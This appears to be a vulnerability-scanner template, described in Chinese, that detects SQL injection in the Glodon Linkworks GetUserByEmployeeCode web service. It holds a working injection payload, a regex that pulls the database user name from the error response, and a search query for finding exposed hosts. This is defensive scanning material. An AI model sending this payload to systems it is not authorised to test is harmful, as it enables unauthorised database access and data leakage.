id: glodon-linkworks-sqli

info:
  name: Glodon Linkworks GWGdWebService - SQL 注入漏洞
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于检测 Glodon Linkworks GWGdWebService - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/Org/service/Service.asmx/GetUserByEmployeeCode` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://github.com/zan8in/pocwiki/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gwgdwebservice%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: banner="Services/Identification/login.ashx"
  tags: glodon,linkworks,sqli,vuln

http:
  - raw:
      - |
        POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        employeeCode=1'-1/user--'&EncryptData=1

    matchers:
      - type: dsl
        dsl:
          - 'status_code==500'
          - 'contains_any(header, "text/html", "text/plain")'
          - 'contains_all(body, "在将 nvarchar 值", "转换成数据类型 int 时失败")'
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '在将 nvarchar 值 &#39;(.*)&#39; 转换成数据类型 int 时失败。'
